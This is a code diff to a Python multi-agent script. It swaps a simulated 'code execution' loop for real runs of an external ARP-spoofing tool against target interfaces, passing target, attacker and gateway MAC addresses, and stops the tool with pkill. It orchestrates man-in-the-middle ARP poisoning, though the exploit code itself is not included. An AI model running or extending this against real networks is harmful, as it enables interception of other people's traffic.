@@ -4,6 +4,7 @@ import random
 import time
 import sys
 from datetime import datetime, timedelta
+import subprocess
 
 INTERFACES = ['Melchior', 'Balthasar', 'Casper']
 TARGET_INTERFACES = ['Maria', 'Rose', 'Sina']
@@ -29,6 +30,7 @@ num_agents = len(INTERFACES)
 interface_lock = [threading.Lock() for _ in range(num_agents)]
 
 # Function to simulate code execution on an interface
+
 def execute_code(agent_id, target_interface): # ARP-poison script: https://github.com/EONRaider/Arp-Spoofer
     agent_name = INTERFACES[agent_id]
     agent_interface_mac = agents_info[agent_name]['interface_mac']
@@ -41,13 +43,28 @@ def execute_code(agent_id, target_interface): # ARP-poison script: https://githu
         duration = random.uniform(2, 4)
         end_time = datetime.now() + timedelta(minutes=duration)
 
-        # Run the loop until the specified end time
-        while datetime.now() < end_time:
-            # Simulate code execution by doing some work
-            # (Replace this with the actual code execution logic)
-            time.sleep(1)  # Simulating work for 1 second
+        command = [
+            'python3',
+            'arp-spoof.py',
+            '-i', target_interface,
+            '--targetmac', targets_info[target_interface]['target_mac'],
+            '--atackermac', agent_interface_mac,
+            '--gatemac', 'DE:BC:50:A7:AD:9E',
+        ]
+        print(f"Agent {agent_name} is running the following command: {' '.join(command)}")
 
-    print(f"Agent {agent_name} finished executing code on {target_interface}.")
+        try:
+            subprocess.run(command, check=True)
+        except subprocess.CalledProcessError as e:
+            print(f"Agent {agent_name} failed to execute the command: {' '.join(command)}")
+            print(f"Error: {e}")
+            # Handle the failure here
+
+        # Run the loop until the specified end time
+        if datetime.now() > end_time :
+            print(f"Agent {agent_name} finished executing code on {target_interface}.")
+            subprocess.run(['pkill', '-f', 'arp-spoof.py'], check=False) 
+            return
 
 
 # Function to run an agent
@@ -85,6 +102,10 @@ def main():
     except KeyboardInterrupt:
         print("\nReceived KeyboardInterrupt. Stopping agents...")
         sys.exit()
+
+    # Stop the ARP spoofing subprocess by sending a signal
+    subprocess.run(['pkill', '-f', 'arp-spoof.py'], check=False) 
+
 
     # Stop the agents by joining the threads
     for thread in threads:
